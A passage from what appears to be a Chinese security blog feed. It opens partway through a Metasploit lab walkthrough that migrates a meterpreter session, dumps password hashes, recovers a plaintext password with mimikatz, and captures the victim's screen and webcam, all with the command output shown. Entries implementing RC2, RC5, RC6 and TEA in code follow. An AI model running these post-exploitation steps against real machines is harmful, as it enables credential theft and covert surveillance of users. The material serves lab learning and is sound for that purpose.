dllhost.exe             x64   0        NT AUTHORITY\SYSTEM 2000  512   svchost.exe             x64   0        NT AUTHORITY\LOCAL SERVICE 2084  512   VSSVC.exe               x64   0        NT AUTHORITY\SYSTEM 2116  2424  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe 2192  2116  powershell.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 2228  632   WmiPrvSE.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe 2320  512   taskhost.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\taskhost.exe 2368  352   conhost.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe 2392  896   dwm.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\dwm.exe 2404  2384  explorer.exe            x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\explorer.exe 2424  1192  cmd.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe 2516  512   svchost.exe             x64   0        NT AUTHORITY\SYSTEM 2548  512   WmiApSrv.exe            x64   0        NT AUTHORITY\SYSTEM 2584  512   mscorsvw.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorsvw.exe 2756  512   SearchIndexer.exe       x64   0        NT AUTHORITY\SYSTEM 2852  2756  SearchFilterHost.exe    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchFilterHost.exe 2888  2756  SearchProtocolHost.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchProtocolHost.exe 2968  2404  cmd.exe                 x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\cmd.exe 2976  416   conhost.exe             x64   1        WIN-Q1ST6EBNLTR\victim        C:\Windows\System32\conhost.exe 3060  3020  powershell.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exemeterpreter &gt; migrate 2368[*] Migrating from 3060 to 2368...[*] Migration completed successfully.meterpreter &gt; sysinfoComputer        : WIN-Q1ST6EBNLTROS              : Windows 7 (Build 7601, Service Pack 1).Architecture    : x64System Language : zh_CNDomain          : WORKGROUPLogged On Users : 2Meterpreter     : x64/windowsmeterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM</code></pre><h3 id="获取用户密码"><a href="#获取用户密码" class="headerlink" title="获取用户密码"></a>获取用户密码</h3><p>利用 hashdump 可以获得所有用户密码的哈希值：</p><pre><code>meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY a648199744904bf08ff1b92b5b224011.../usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Obtaining the user list and keys...[*] Decrypting user keys.../usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::victim:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::hacker:1001:aad3b435b51404eeaad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157:::</code></pre><p>使用神器 mimikatz 有可能能得到密码的明文：</p><pre><code>meterpreter &gt; load mimikatzLoading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#39;load kiwi&#39; instead?Success.meterpreter &gt; wdigest[+] Running as SYSTEM[*] Retrieving wdigest credentialswdigest credentials===================AuthID    Package    Domain           User              Password------    -------    ------           ----              --------0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE0;996     Negotiate  WORKGROUP        WIN-Q1ST6EBNLTR$0;52252   NTLM0;999     NTLM       WORKGROUP        WIN-Q1ST6EBNLTR$0;333800  NTLM       WIN-Q1ST6EBNLTR  victim            admin1230;333754  NTLM       WIN-Q1ST6EBNLTR  victim            admin123</code></pre><h3 id="截取屏幕"><a href="#截取屏幕" class="headerlink" title="截取屏幕"></a>截取屏幕</h3><p>使用 screenshot 可以截取桌面实时图片：</p><pre><code>meterpreter &gt; screenshotScreenshot saved to: /root/NjEXrhqY.jpeg</code></pre><p><img src="/pics/Have-Fun-with-Metasploit-Framework/2.png" srcset="/img/loading.gif" alt></p><h3 id="用摄像头拍照"><a href="#用摄像头拍照" class="headerlink" title="用摄像头拍照"></a>用摄像头拍照</h3><p>使用 webcam 系列命令可以用摄像头拍照：</p><pre><code>meterpreter &gt; webcam_list1: VMware Virtual USB Video Devicemeterpreter &gt; webcam_snap[*] Starting...[+] Got frame[*] StoppedWebcam shot saved to: /root/jkhYoacC.jpeg</code></pre><p><img src="/pics/Have-Fun-with-Metasploit-Framework/3.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.51cto.com/chenxinjie/2092754" target="_blank" rel="noopener">https://blog.51cto.com/chenxinjie/2092754</a><br><a href="https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Q</a><br><a href="https://www.anquanke.com/post/id/164525" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164525</a><br><a href="https://zhuanlan.zhihu.com/p/25857679" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25857679</a><br><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a><br><a href="http://hardsec.net/mimikatz-meterpreter-extension/?lang=en" target="_blank" rel="noopener">http://hardsec.net/mimikatz-meterpreter-extension/?lang=en</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言实现RC2、RC5、RC6加密解密算法</title>
    <link href="/2019/09/03/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0RC2%E3%80%81RC5%E3%80%81RC6%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <url>/2019/09/03/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0RC2%E3%80%81RC5%E3%80%81RC6%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>现在总共有六个 RC 系列的算法。其中 RC1 从来没有发布过，RC3 在开始使用前就被证明是不安全的。余下的都是现如今有所运用的算法。</p><ol><li>RC2 是一个于 1987 年发布的 64 位分组加密算法。</li><li>RC4 是当今运用最广泛的序列密码。</li><li>RC5 是一个于 1994 年发布的 32/64/128 位分组加密算法。</li><li>RC6 是一个于 1997 年发布的基于 RC5 的 128 位分组加密算法，在当年 AES 的评选中曾是 AES 决赛算法。</li></ol><p>了解过算法的基本知识后，下面是 RC2、RC5 以及 RC6 在 C 语言下的实现。</p><h1 id="RC2"><a href="#RC2" class="headerlink" title="RC2"></a><a href="https://en.wikipedia.org/wiki/RC2" target="_blank" rel="noopener">RC2</a></h1><p>RC2 是一种分组密码，和 DES 很像，它的输入和输出的长度都是 64 位，而密钥是可变的，长度范围是从 1 到 128 比特，目前使用的是 8 比特的密钥。RC2 被设计成能够在 16 位处理器上运行。在 IBM AT 上它能够比 DES 的加密速度快一倍（假设在完成密钥扩展的情况下）。</p><p>RC2 总共分为三个算法步骤。分别是密钥扩展、加密、解密。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc2.png" srcset="/img/loading.gif" alt></p><h2 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>密钥扩展通过一个长度变化的密钥生成 64 个字数组。</p><pre><code class="cpp">void rc2_keygen(unsigned short xkey[64], const unsigned char *key, unsigned len, unsigned bits){    unsigned char x;    unsigned i;    /* 256-entry permutation table, probably derived somehow from pi */    static const unsigned char PITABLE[256] = {0xD9, 0x78, 0xF9, 0xC4, 0x19, 0xDD, 0xB5, 0xED, 0x28, 0xE9, 0xFD, 0x79, 0x4A, 0xA0, 0xD8, 0x9D, 0xC6, 0x7E, 0x37, 0x83, 0x2B, 0x76, 0x53, 0x8E, 0x62, 0x4C, 0x64, 0x88, 0x44, 0x8B, 0xFB, 0xA2, 0x17, 0x9A, 0x59, 0xF5, 0x87, 0xB3, 0x4F, 0x13, 0x61, 0x45, 0x6D, 0x8D, 0x09, 0x81, 0x7D, 0x32, 0xBD, 0x8F, 0x40, 0xEB, 0x86, 0xB7, 0x7B, 0x0B, 0xF0, 0x95, 0x21, 0x22, 0x5C, 0x6B, 0x4E, 0x82, 0x54, 0xD6, 0x65, 0x93, 0xCE, 0x60, 0xB2, 0x1C, 0x73, 0x56, 0xC0, 0x14, 0xA7, 0x8C, 0xF1, 0xDC, 0x12, 0x75, 0xCA, 0x1F, 0x3B, 0xBE, 0xE4, 0xD1, 0x42, 0x3D, 0xD4, 0x30, 0xA3, 0x3C, 0xB6, 0x26, 0x6F, 0xBF, 0x0E, 0xDA, 0x46, 0x69, 0x07, 0x57, 0x27, 0xF2, 0x1D, 0x9B, 0xBC, 0x94, 0x43, 0x03, 0xF8, 0x11, 0xC7, 0xF6, 0x90, 0xEF, 0x3E, 0xE7, 0x06, 0xC3, 0xD5, 0x2F, 0xC8, 0x66, 0x1E, 0xD7, 0x08, 0xE8, 0xEA, 0xDE, 0x80, 0x52, 0xEE, 0xF7, 0x84, 0xAA, 0x72, 0xAC, 0x35, 0x4D, 0x6A, 0x2A, 0x96, 0x1A, 0xD2, 0x71, 0x5A, 0x15, 0x49, 0x74, 0x4B, 0x9F, 0xD0, 0x5E, 0x04, 0x18, 0xA4, 0xEC, 0xC2, 0xE0, 0x41, 0x6E, 0x0F, 0x51, 0xCB, 0xCC, 0x24, 0x91, 0xAF, 0x50, 0xA1, 0xF4, 0x70, 0x39, 0x99, 0x7C, 0x3A, 0x85, 0x23, 0xB8, 0xB4, 0x7A, 0xFC, 0x02, 0x36, 0x5B, 0x25, 0x55, 0x97, 0x31, 0x2D, 0x5D, 0xFA, 0x98, 0xE3, 0x8A, 0x92, 0xAE, 0x05, 0xDF, 0x29, 0x10, 0x67, 0x6C, 0xBA, 0xC9, 0xD3, 0x00, 0xE6, 0xCF, 0xE1, 0x9E, 0xA8, 0x2C, 0x63, 0x16, 0x01, 0x3F, 0x58, 0xE2, 0x89, 0xA9, 0x0D, 0x38, 0x34, 0x1B, 0xAB, 0x33, 0xFF, 0xB0, 0xBB, 0x48, 0x0C, 0x5F, 0xB9, 0xB1, 0xCD, 0x2E, 0xC5, 0xF3, 0xDB, 0x47, 0xE5, 0xA5, 0x9C, 0x77, 0x0A, 0xA6, 0x20, 0x68, 0xFE, 0x7F, 0xC1, 0xAD};    assert(len &gt; 0 &amp;&amp; len &lt;= 128);    assert(bits &lt;= 1024);    if (!bits)        bits = 1024;    memcpy(xkey, key, len);    /* Phase 1: Expand input key to 128 bytes */    // for i = T, T+1, ..., 127 do    //     L[i] = PITABLE[L[i-1] + L[i-T]];    if (len &lt; 128)    {        i = 0;        x = ((unsigned char *)xkey)[len - 1];        do        {            x = PITABLE[(x + ((unsigned char *)xkey)[i++]) &amp; 255];            ((unsigned char *)xkey)[len++] = x;        } while (len &lt; 128);    }    /* Phase 2 - reduce effective key size to &quot;bits&quot; */    // L[128-T8] = PITABLE[L[128-T8] &amp; TM];    len = (bits + 7) &gt;&gt; 3; // bits = T1, len = T8, T8 = (T1+7)/8;    i = 128 - len;    x = PITABLE[((unsigned char *)xkey)[i] &amp; (255 &gt;&gt; (7 &amp; -bits))]; // (255 &gt;&gt; (7 &amp; -bits) = TM, TM = 255 MOD 2^(8 + T1 - 8*T8);    ((unsigned char *)xkey)[i] = x;    // for i = 127-T8, ..., 0 do    //     L[i] = PITABLE[L[i+1] XOR L[i+T8]];    while (i--)    {        x = PITABLE[x ^ ((unsigned char *)xkey)[i + len]];        ((unsigned char *)xkey)[i] = x;    }    /* Phase 3 - copy to xkey in little-endian order */    i = 63;    do    {        xkey[i] = ((unsigned char *)xkey)[2 * i] +                  (((unsigned char *)xkey)[2 * i + 1] &lt;&lt; 8);    } while (i--);}</code></pre><h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><p>加密操作将一组 64 比特的字存入 4 个字中再进行加密。</p><pre><code class="cpp">void rc2_encrypt(unsigned short xkey[64], unsigned char *plain, unsigned char *cipher){    // xkey = K, plain = R    unsigned x76, x54, x32, x10, i;    x76 = (plain[7] &lt;&lt; 8) + plain[6];    x54 = (plain[5] &lt;&lt; 8) + plain[4];    x32 = (plain[3] &lt;&lt; 8) + plain[2];    x10 = (plain[1] &lt;&lt; 8) + plain[0];    for (i = 0; i &lt; 16; i++)    {        // R[i] = R[i] + K[j] + (R[i-1] &amp; R[i-2]) + ((~R[i-1]) &amp; R[i-3]);        // j = j + 1;        // R[i] = R[i] rol s[i];        x10 += (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[4 * i + 0];        x10 = (x10 &lt;&lt; 1) + (x10 &gt;&gt; 15 &amp; 1);        x32 += (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[4 * i + 1];        x32 = (x32 &lt;&lt; 2) + (x32 &gt;&gt; 14 &amp; 3);        x54 += (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[4 * i + 2];        x54 = (x54 &lt;&lt; 3) + (x54 &gt;&gt; 13 &amp; 7);        x76 += (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[4 * i + 3];        x76 = (x76 &lt;&lt; 5) + (x76 &gt;&gt; 11 &amp; 31);        // R[i] = R[i] + K[R[i-1] &amp; 63];        if (i == 4 || i == 10)        {            x10 += xkey[x76 &amp; 63];            x32 += xkey[x10 &amp; 63];            x54 += xkey[x32 &amp; 63];            x76 += xkey[x54 &amp; 63];        }    }    cipher[0] = (unsigned char)x10;    cipher[1] = (unsigned char)(x10 &gt;&gt; 8);    cipher[2] = (unsigned char)x32;    cipher[3] = (unsigned char)(x32 &gt;&gt; 8);    cipher[4] = (unsigned char)x54;    cipher[5] = (unsigned char)(x54 &gt;&gt; 8);    cipher[6] = (unsigned char)x76;    cipher[7] = (unsigned char)(x76 &gt;&gt; 8);}</code></pre><h2 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密操作即为加密操作的逆运算。</p><pre><code class="cpp">void rc2_decrypt(unsigned short xkey[64], unsigned char *plain, unsigned char *cipher){    unsigned x76, x54, x32, x10, i;    x76 = (cipher[7] &lt;&lt; 8) + cipher[6];    x54 = (cipher[5] &lt;&lt; 8) + cipher[4];    x32 = (cipher[3] &lt;&lt; 8) + cipher[2];    x10 = (cipher[1] &lt;&lt; 8) + cipher[0];    i = 15;    do    {        // R[i] = R[i] ror s[i];        // R[i] = R[i] - K[j] - (R[i-1] &amp; R[i-2]) - ((~R[i-1]) &amp; R[i-3]);        // j = j - 1;        x76 &amp;= 65535;        x76 = (x76 &lt;&lt; 11) + (x76 &gt;&gt; 5);        x76 -= (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[4 * i + 3];        x54 &amp;= 65535;        x54 = (x54 &lt;&lt; 13) + (x54 &gt;&gt; 3);        x54 -= (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[4 * i + 2];        x32 &amp;= 65535;        x32 = (x32 &lt;&lt; 14) + (x32 &gt;&gt; 2);        x32 -= (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[4 * i + 1];        x10 &amp;= 65535;        x10 = (x10 &lt;&lt; 15) + (x10 &gt;&gt; 1);        x10 -= (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[4 * i + 0];        // R[i] = R[i] - K[R[i-1] &amp; 63];        if (i == 5 || i == 11)        {            x76 -= xkey[x54 &amp; 63];            x54 -= xkey[x32 &amp; 63];            x32 -= xkey[x10 &amp; 63];            x10 -= xkey[x76 &amp; 63];        }    } while (i--);    plain[0] = (unsigned char)x10;    plain[1] = (unsigned char)(x10 &gt;&gt; 8);    plain[2] = (unsigned char)x32;    plain[3] = (unsigned char)(x32 &gt;&gt; 8);    plain[4] = (unsigned char)x54;    plain[5] = (unsigned char)(x54 &gt;&gt; 8);    plain[6] = (unsigned char)x76;    plain[7] = (unsigned char)(x76 &gt;&gt; 8);}</code></pre><h1 id="RC5"><a href="#RC5" class="headerlink" title="RC5"></a><a href="https://en.wikipedia.org/wiki/RC5" target="_blank" rel="noopener">RC5</a></h1><p>RC5 同样也是分组密码，它支持可变的分组大小(32、64 或 128 比特)，密钥长度（0 至 2040 位）和加密轮数（0 ～ 255）。RC5 中有几个参数，w 代表一个字的字节大小，RC5 是以一个字为单位来进行所有操作的；r 代表加密轮数；b 代表密钥的长度。RC5 常用的 w 通常为 16、32 和 64。下面实现的是 w 为 32 时的 RC5 算法。</p><p>RC5 和 RC2 类似，总共分为三个算法步骤。分别是密钥扩展、加密、解密。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc5.png" srcset="/img/loading.gif" alt></p><p>算法中需要一些宏定义：</p><pre><code class="cpp">typedef unsigned int WORD;           /* Should be 32-bit = 4 bytes        */#define w 32                         /* word size in bits                 */#define r 12                         /* number of rounds                  */#define b 16                         /* number of bytes in key            */#define c 4                          /* number words in key               */#define t 26                         /* size of table S = 2*(r+1) words   */WORD S[t];                           /* expanded key table                */WORD P = 0xb7e15163, Q = 0x9e3779b9; /* magic constants                   *//* Rotation operators. x must be unsigned, to get logical right shift     */#define ROTL(x, y) (((x) &lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))#define ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1)))))</code></pre><h2 id="密钥扩展算法-1"><a href="#密钥扩展算法-1" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>密钥扩展首先分别初始化 L 数组和 S 盒，随后通过 L 进行按字异或得到 S 盒。</p><pre><code class="cpp">void rc5_keygen(unsigned char *K) /* secret input ket K[0...b-1] */{    WORD i, j, k, u = w / 8, A, B, L[c];    /* Initialize L, then S, then mix key into S */    for (i = b - 1, L[c - 1] = 0; i != -1; i--)    {        L[i / u] = (L[i / u] &lt;&lt; 8) + K[i];    }    for (S[0] = P, i = 1; i &lt; t; i++)    {        S[i] = S[i - 1] + Q;    }    for (A = B = i = j = k = 0; k &lt; 3 * t; k++, i = (i + 1) % t, j = (j + 1) % c) /* 3*t &gt; 3*c */    {        A = S[i] = ROTL(S[i] + (A + B), 3);        B = L[j] = ROTL(L[j] + (A + B), (A + B));    }}</code></pre><h2 id="加密算法-1"><a href="#加密算法-1" class="headerlink" title="加密算法"></a>加密算法</h2><p>加密涉及的一个简单轮函数的加密。基于安全需要和时间方面的考虑，建议 12 或 20 轮加密。</p><pre><code class="cpp">void rc5_encrypt(unsigned char *plain, unsigned char *cipher) /* 2 WORD input pt/output ct */{    WORD pt[2], ct[2];    for (int i = 0; i &lt; 2; i++)    {        pt[i] = plain[4 * i] + (plain[4 * i + 1] &lt;&lt; 8) + (plain[4 * i + 2] &lt;&lt; 16) + (plain[4 * i + 3] &lt;&lt; 24);    }    WORD A = pt[0] + S[0], B = pt[1] + S[1];    for (int i = 1; i &lt;= r; i++)    {        A = ROTL(A ^ B, B) + S[2 * i];        B = ROTL(B ^ A, A) + S[2 * i + 1];    }    ct[0] = A;    ct[1] = B;    for (int i = 0; i &lt; 2; i++)    {        cipher[4 * i] = ct[i] &amp; 0xFF;        cipher[4 * i + 1] = (ct[i] &gt;&gt; 8) &amp; 0xFF;        cipher[4 * i + 2] = (ct[i] &gt;&gt; 16) &amp; 0xFF;        cipher[4 * i + 3] = (ct[i] &gt;&gt; 24) &amp; 0xFF;    }}</code></pre><h2 id="解密算法-1"><a href="#解密算法-1" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密实际上就是加密过程的逆运算。</p><pre><code class="cpp">void rc5_decrypt(unsigned char *cipher, unsigned char *plain) /* 2 WORD input ct/output pt */{    WORD pt[2], ct[2];    for (int i = 0; i &lt; 2; i++)    {        ct[i] = cipher[4 * i] + (cipher[4 * i + 1] &lt;&lt; 8) + (cipher[4 * i + 2] &lt;&lt; 16) + (cipher[4 * i + 3] &lt;&lt; 24);    }    WORD B = ct[1], A = ct[0];    for (int i = r; i &gt; 0; i--)    {        B = ROTR(B - S[2 * i + 1], A) ^ A;        A = ROTR(A - S[2 * i], B) ^ B;    }    pt[1] = B - S[1];    pt[0] = A - S[0];    for (int i = 0; i &lt; 2; i++)    {        plain[4 * i] = pt[i] &amp; 0xFF;        plain[4 * i + 1] = (pt[i] &gt;&gt; 8) &amp; 0xFF;        plain[4 * i + 2] = (pt[i] &gt;&gt; 16) &amp; 0xFF;        plain[4 * i + 3] = (pt[i] &gt;&gt; 24) &amp; 0xFF;    }}</code></pre><h1 id="RC6"><a href="#RC6" class="headerlink" title="RC6"></a><a href="https://en.wikipedia.org/wiki/RC6" target="_blank" rel="noopener">RC6</a></h1><p>RC6 是一个从 RC5 派生而来的对称分组加密算法，用以满足高级加密标准（AES）竞赛的要求。RC6 拥有 128 位的块大小，支持 128、192、256 位乃至 2040 位的密钥长度。像 RC5 一样，RC6 是可以被参数化的。它也因而支持变长的分组大小、密钥长度以及加密轮数。RC6 和 RC5 在结构、使用基于数据的置换规则、取模加法以及异或操作等很多方面都很相似。事实上，RC6 可以被看做是交织的两组平行的 RC5 加密。其中，RC6 使用了乘法运算，能够让置换基于字中每一位，而不是其中的几位。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc6.jpeg" srcset="/img/loading.gif" alt></p><p>算法中需要一些宏定义：</p><pre><code class="cpp">typedef unsigned int WORD;           /* Should be 32-bit = 4 bytes        */#define w 32                         /* word size in bits                 */#define r 20                         /* based on security estimates       */#define bytes (w / 8)                /* bytes per word                    */#define c ((b + bytes - 1) / bytes)  /* key in words, rounded up          */#define R24 (2 * r + 4)              /* length of array S                 */#define lgw 5                        /* log2(w) -- wussed out             */WORD S[R24 - 1];                     /* Key schedule                      */WORD P = 0xb7e15163, Q = 0x9e3779b9; /* magic constants                   *//* Rotation operators. x must be unsigned, to get logical right shift     */#define ROTL(x, y) (((x) &lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))#define ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1)))))</code></pre><h2 id="密钥扩展算法-2"><a href="#密钥扩展算法-2" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>RC6 中接受的密钥长度相比于 RC5 更长，生成的 S 盒大小为 2r+4。</p><pre><code class="cpp">void rc6_keygen(unsigned char *K, int b){    int i, j, s, v;    WORD L[(32 + bytes - 1) / bytes]; /* Big enough for max b */    WORD A, B;    L[c - 1] = 0;    for (i = b - 1; i &gt;= 0; i--)        L[i / bytes] = (L[i / bytes] &lt;&lt; 8) + K[i];    S[0] = P;    for (i = 1; i &lt;= 2 * r + 3; i++)        S[i] = S[i - 1] + Q;    A = B = i = j = 0;    v = R24;    if (c &gt; v)        v = c;    v *= 3;    for (s = 1; s &lt;= v; s++)    {        A = S[i] = ROTL(S[i] + A + B, 3);        B = L[j] = ROTL(L[j] + A + B, A + B);        i = (i + 1) % R24;        j = (j + 1) % c;    }}</code></pre><h2 id="加密算法-2"><a href="#加密算法-2" class="headerlink" title="加密算法"></a>加密算法</h2><p>RC6 加密时比 RC5 多了乘法运算，加密过程也变得更复杂。</p><pre><code class="cpp">void rc6_encrypt(unsigned char *plain, unsigned char *cipher){    WORD pt[4], ct[4];    for (int i = 0; i &lt; 4; i++)    {        pt[i] = plain[4 * i] + (plain[4 * i + 1] &lt;&lt; 8) + (plain[4 * i + 2] &lt;&lt; 16) + (plain[4 * i + 3] &lt;&lt; 24);    }    WORD A, B, C, D, t, u, x;    A = pt[0];    B = pt[1];    C = pt[2];    D = pt[3];    B += S[0];    D += S[1];    for (int i = 2; i &lt;= 2 * r; i += 2)    {        t = ROTL(B * (2 * B + 1), lgw);        u = ROTL(D * (2 * D + 1), lgw);        A = ROTL(A ^ t, u) + S[i];        C = ROTL(C ^ u, t) + S[i + 1];        x = A;        A = B;        B = C;        C = D;        D = x;    }    A += S[2 * r + 2];    C += S[2 * r + 3];    ct[0] = A;    ct[1] = B;    ct[2] = C;    ct[3] = D;    for (int i = 0; i &lt; 4; i++)    {        cipher[4 * i] = ct[i] &amp; 0xFF;        cipher[4 * i + 1] = (ct[i] &gt;&gt; 8) &amp; 0xFF;        cipher[4 * i + 2] = (ct[i] &gt;&gt; 16) &amp; 0xFF;        cipher[4 * i + 3] = (ct[i] &gt;&gt; 24) &amp; 0xFF;    }}</code></pre><h2 id="解密算法-2"><a href="#解密算法-2" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密过程同样是加密过程的逆运算。</p><pre><code class="cpp">void rc6_decrypt(unsigned char *cipher, unsigned char *plain){    WORD pt[4], ct[4];    for (int i = 0; i &lt; 4; i++)    {        ct[i] = cipher[4 * i] + (cipher[4 * i + 1] &lt;&lt; 8) + (cipher[4 * i + 2] &lt;&lt; 16) + (cipher[4 * i + 3] &lt;&lt; 24);    }    WORD A, B, C, D, t, u, x;    A = ct[0];    B = ct[1];    C = ct[2];    D = ct[3];    C -= S[2 * r + 3];    A -= S[2 * r + 2];    for (int i = 2 * r; i &gt;= 2; i -= 2)    {        x = D;        D = C;        C = B;        B = A;        A = x;        u = ROTL(D * (2 * D + 1), lgw);        t = ROTL(B * (2 * B + 1), lgw);        C = ROTR(C - S[i + 1], t) ^ u;        A = ROTR(A - S[i], u) ^ t;    }    D -= S[1];    B -= S[0];    pt[0] = A;    pt[1] = B;    pt[2] = C;    pt[3] = D;    for (int i = 0; i &lt; 4; i++)    {        plain[4 * i] = pt[i] &amp; 0xFF;        plain[4 * i + 1] = (pt[i] &gt;&gt; 8) &amp; 0xFF;        plain[4 * i + 2] = (pt[i] &gt;&gt; 16) &amp; 0xFF;        plain[4 * i + 3] = (pt[i] &gt;&gt; 24) &amp; 0xFF;    }}</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://en.wikipedia.org/wiki/RC_algorithm" target="_blank" rel="noopener">RC_algorithm</a><br><a href="https://www.ripublication.com/irph/ijict_spl/ijictv4n17spl_13.pdf" target="_blank" rel="noopener">A Comparative Study of Rivest Cipher Algorithms</a><br><a href="http://113.209.194.153/ds_pdf/13711077.pdf" target="_blank" rel="noopener">现代密码学教程</a><br><a href="https://tools.ietf.org/pdf/rfc2268.pdf" target="_blank" rel="noopener">A Description of the RC2(r) Encryption Algorithm</a><br><a href="http://people.csail.mit.edu/rivest/Rivest-rc5rev.pdf" target="_blank" rel="noopener">The RC5 Encryption Algorithm</a><br><a href="http://people.csail.mit.edu/rivest/pubs/RRSY98.pdf" target="_blank" rel="noopener">The RC6 Block Cipher</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>c</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python实现TEA、XTEA、XXTEA加密解密算法</title>
    <link href="/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <url>/2019/08/22/Python%E5%AE%9E%E7%8E%B0TEA%E3%80%81XTEA%E3%80%81XXTEA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>闲来无事，喝杯茶冷静一下。</p><a id="more"></a><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a><a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm" target="_blank" rel="noopener">TEA</a></h1><p>微型加密算法（<code>Tiny Encryption Algorithm</code>，<code>TEA</code>）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。<code>TEA</code> 操作处理在两个 <code>32</code> 位无符号整型上（可能源于一个 <code>64</code> 位数据），并且使用一个 <code>128</code> 位的密钥。设计者是 <code>Roger Needham</code> 和 <code>David Wheeler</code>。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/1.png" srcset="/img/loading.gif" alt></p><p>Python 实现：</p><pre><code class="python">#!/usr/bin/env pythondef encrypt(v, k):    v0 = v[0]    v1 = v[1]    x = 0    delta = 0x9E3779B9    k0 = k[0]    k1 = k[1]    k2 = k[2]    k3 = k[3]    for i in range(32):        x += delta        x = x &amp; 0xFFFFFFFF        v0 += 